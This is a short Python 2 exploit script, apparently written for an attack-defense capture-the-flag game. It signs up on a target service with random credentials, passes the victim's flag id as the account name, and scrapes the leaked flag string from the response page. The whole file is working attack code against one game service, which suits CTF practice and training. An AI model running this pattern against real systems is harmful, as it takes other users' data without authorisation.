#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests
import re
import sys
import random
import string

_USER_ = ''.join(random.choice(string.ascii_letters) for i in range(32))
_PASS_ = ''.join(random.choice(string.ascii_letters) for i in range(32))

def exploit(ip, port, flag_id):
    response = requests.post('http://%s:%d/' % (ip, int(port)),
        data={
            'login': _USER_,
            'password': _PASS_,
            'name': flag_id,
            'action': 'signup'
        })
    if response.status_code == requests.codes.ok:
        m = re.search(r'<p[^>]*>\s*(FLG.{13})\s*</p>', response.text)
        if m:
            return m.group(1)
        else:
            raise Exception('Flag not found')
    else:
        raise Exception('Error on remote page')


if __name__ == '__main__':
    print exploit(*sys.argv[1:])

